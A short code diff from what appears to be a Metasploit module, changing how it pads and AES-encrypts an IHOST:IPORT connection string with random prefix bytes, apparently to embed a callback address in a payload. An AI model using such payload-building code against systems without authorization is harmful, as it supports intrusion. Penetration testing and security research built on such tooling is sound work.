@@ -40,8 +40,9 @@ module MetasploitModule
     iconn = datastore['IHOST']
     iconn += ':'
     iconn += datastore['IPORT']
-    n = rand(7...50)
-    r = Random.new.bytes(n - n % 4)
+    iconn += ("\0" * (31 - iconn.length))
+    n = rand(1...10)
+    r = Random.new.bytes(n * 4)
 
     magic = r
     magic += Aes256.encrypt_aes256(datastore['IV'], datastore['KEY'], iconn)
